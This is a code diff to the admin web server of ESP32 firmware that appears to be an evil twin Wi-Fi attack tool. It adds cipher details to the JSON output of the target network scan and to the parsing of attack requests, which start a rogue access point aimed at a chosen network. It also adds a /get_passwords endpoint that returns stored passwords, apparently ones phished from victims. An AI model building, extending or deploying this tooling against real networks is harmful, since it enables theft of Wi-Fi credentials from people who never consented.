@@ -18,6 +18,7 @@
 #include <lwip/netdb.h>
 #include "esp_http_server.h"
 
+#include "passwordMng.h"
 #include "server.h"
 #include "web/admin_page.h"
 #include "config.h"
@@ -32,14 +33,18 @@ static const char *TAG = "ADMIN_SERVER:";
 static const char *authmode_str[] = {
         "Open", "WEP", "WPA/PSK", "WPA2/PSK", "WPA_WPA2/PSK", "WPA3/PSK", "WPA2_WPA3/PSK", "WAPI/PSK"
 };
-// static const char *cipher_str[] = {
-//     "None", "WEP40", "WEP104", "TKIP", "CCMP", "TKIP_CCMP", "AES_CMAC", "Unknown"
-// };
 /* Buffers for json used for network scanning */
 static char json_response[4096];
-static char entry[256];
+static char entry[300];
 
 
+
+/**
+ * @brief Admin page index handler
+ * 
+ * @param req 
+ * @return esp_err_t 
+ */
 static esp_err_t admin_page_handler(httpd_req_t *req) 
 {
     char ssid[32] = {0};
@@ -79,6 +84,12 @@ static esp_err_t admin_page_handler(httpd_req_t *req)
 }
 
 
+/**
+ * @brief Save the new ssid, password and channel for admin AP to NVS
+ * 
+ * @param req 
+ * @return esp_err_t 
+ */
 static esp_err_t admin_page_settings_ap_submit_handler(httpd_req_t *req)
 {
     char buffer[256];
@@ -110,6 +121,12 @@ static esp_err_t admin_page_settings_ap_submit_handler(httpd_req_t *req)
 } 
 
 
+/**
+ * @brief Return the network scan result in the page
+ * 
+ * @param req 
+ * @return esp_err_t 
+ */
 static esp_err_t targets_scan_handler(httpd_req_t *req) 
 {
     wifi_scan_config_t scan_config = {
@@ -138,8 +155,8 @@ static esp_err_t targets_scan_handler(httpd_req_t *req)
                  "\"channel\":%d,"
                  "\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\","
                  "\"authmode\":\"%s\","
-                 //"\"pairwise_cipher\":\"%s\","
-                 //"\"group_cipher\":\"%s\","
+                 "\"pairwise_cipher\":\"%d\","
+                 "\"group_cipher\":\"%d\","
                  "\"wps\":%d}%s",
                  ap_records[i].ssid,
                  ap_records[i].rssi,
@@ -147,8 +164,8 @@ static esp_err_t targets_scan_handler(httpd_req_t *req)
                  ap_records[i].bssid[0], ap_records[i].bssid[1], ap_records[i].bssid[2],
                  ap_records[i].bssid[3], ap_records[i].bssid[4], ap_records[i].bssid[5],
                  authmode_str[ap_records[i].authmode],
-                 //cipher_str[ap_records[i].pairwise_cipher],
-                 //cipher_str[ap_records[i].group_cipher],
+                 ap_records[i].pairwise_cipher,
+                 ap_records[i].group_cipher,
                  ap_records[i].wps,
                  (i < ap_count - 1) ? "," : "");
         strncat(json_response, entry, sizeof(json_response) - strlen(json_response) - 1);
@@ -161,6 +178,12 @@ static esp_err_t targets_scan_handler(httpd_req_t *req)
 }
 
 
+/**
+ * @brief Return the admin page favicon
+ * 
+ * @param req 
+ * @return esp_err_t 
+ */
 static esp_err_t admin_favicon_handler(httpd_req_t *req) 
 {
     httpd_resp_set_type(req, "image/png");
@@ -169,9 +192,15 @@ static esp_err_t admin_favicon_handler(httpd_req_t *req)
 }
 
 
+/**
+ * @brief Handle evil_twin POST request with target data and start Attack
+ * 
+ * @param req 
+ * @return esp_err_t 
+ */
 static esp_err_t evil_twin_handler(httpd_req_t *req) 
 {
-    char buffer[256];
+    char buffer[300];
     int ret = httpd_req_recv(req, buffer, sizeof(buffer) - 1);
     if (ret <= 0) {
         if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
@@ -182,7 +211,8 @@ static esp_err_t evil_twin_handler(httpd_req_t *req)
     buffer[ret] = '\0';
     char bssid[64] = {0};
     target_info_t target_info = { 0 };
-    sscanf(buffer,"ssid=%32[^&]&bssid=%17[^&]&channel=%hhu&signal=%hhd&scheme=%hhd", target_info.ssid, bssid, &target_info.channel, &target_info.rssi, &target_info.attack_scheme);
+    sscanf(buffer,"ssid=%32[^&]&bssid=%17[^&]&channel=%hhu&signal=%hhd&pairwise=%hhu&group=%hhu&scheme=%hhd", 
+    target_info.ssid, bssid, &target_info.channel, &target_info.rssi, (unsigned char *)&target_info.pairwise_cipher, (unsigned char *)&target_info.group_cipher, &target_info.attack_scheme);
 
     if (sscanf(bssid, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                &target_info.bssid[0], &target_info.bssid[1], &target_info.bssid[2],
@@ -197,6 +227,19 @@ static esp_err_t evil_twin_handler(httpd_req_t *req)
     /* Start evil twin attack */
     evil_twin_start_attack(&target_info);
 
+    return ESP_OK;
+}
+
+
+/**
+ * @brief Handle get_password POST request and return the saved password from SPIFFS 
+ * 
+ * @param req 
+ * @return esp_err_t 
+ */
+static esp_err_t get_password_handler(httpd_req_t *req) 
+{
+    password_manager_read_passwords(req);
     return ESP_OK;
 }
 
@@ -260,6 +303,15 @@ void http_admin_server_start(void)
             .user_ctx = NULL
         };
         httpd_register_uri_handler(server, &evil_twin_uri);
+
+        /* Get saved password */
+        httpd_uri_t get_password_uri = {
+            .uri = "/get_passwords",
+            .method = HTTP_POST,
+            .handler = get_password_handler,
+            .user_ctx = NULL
+        };
+        httpd_register_uri_handler(server, &get_password_uri);
     }
 }
 
